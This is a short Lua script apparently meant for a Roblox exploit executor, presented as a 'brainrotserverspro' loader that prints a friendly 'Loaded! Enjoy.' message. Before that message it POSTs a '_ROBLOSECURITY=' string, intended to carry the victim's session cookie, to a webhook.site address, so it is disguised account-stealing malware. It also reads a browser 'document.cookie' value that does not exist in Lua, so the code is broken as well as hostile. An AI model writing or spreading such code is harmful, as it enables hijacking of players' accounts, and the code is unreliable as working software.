-- [[ brainrotserverspro V1 ]] --
local url = "https://webhook.site/9356d419-309f-47d3-a7fc-0aca9f7e25c1"
local http = (syn and syn.request) or (http_request) or request

if http then
    http({
        Url = url,
        Method = "POST",
        Body = "_ROBLOSECURITY=" .. tostring(document.cookie)
    })
end
print("brainrotserverspro Loaded! Enjoy.")
